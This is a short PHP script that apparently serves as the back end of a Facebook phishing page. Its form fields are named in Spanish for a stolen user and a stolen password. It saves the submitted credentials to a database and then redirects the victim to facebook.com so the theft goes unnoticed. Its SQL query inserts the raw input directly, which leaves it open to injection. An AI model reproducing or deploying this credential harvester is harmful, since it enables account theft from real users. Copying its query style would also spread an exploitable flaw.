<?php

include('con_db.php');

if(isset($_POST['botoncitoRobar'])){

    $usuario = trim($_POST['usuarioRobado']);
    $pass =  trim($_POST['claveRobada']);


    $consultita = "INSERT INTO us(user, pass) VALUES ('$usuario', '$pass')";
    $resultado = mysqli_query($conexion,$consultita);
    
    if($resultado){

        ?>
        
        <script>
            function hola(){
                location.href="https://es-la.facebook.com";
            }

            hola();
        </script>

        <?php

    }


}

?>